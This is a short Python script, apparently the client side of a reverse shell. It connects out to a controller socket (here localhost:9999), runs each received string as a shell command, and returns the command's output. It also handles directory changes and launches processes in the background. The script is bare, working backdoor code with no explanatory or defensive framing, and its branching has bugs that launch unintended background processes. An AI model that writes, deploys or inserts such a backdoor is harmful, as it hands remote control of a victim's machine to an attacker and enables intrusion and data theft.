import socket
import subprocess
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    server.connect(('localhost',9999))
except:
    __import__('sys').exit()
while True:
    query=server.recv(2048)
    if len(query)>0:
        try:
            if query.decode('ascii')[:4]!='exec':
                proc=subprocess.Popen(query.decode('ascii'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                output=proc.stdout.read() + proc.stderr.read()
                if len(output)>0 or 'cd' in query.decode('ascii'):
                    server.send(output)
                else:
                    server.send(b'Null\n')
            if query.decode('ascii')[:2]=='cd':
                __import__('os').chdir(query.decode('ascii')[3:])
                server.send(bytes('currend directory : '+__import__('os').getcwd(),'utf-8'))
            else:
                proc=subprocess.Popen(query.decode('ascii')[5:])
                server.send(b'executed in the background')
            
        except Exception as error:
            pass
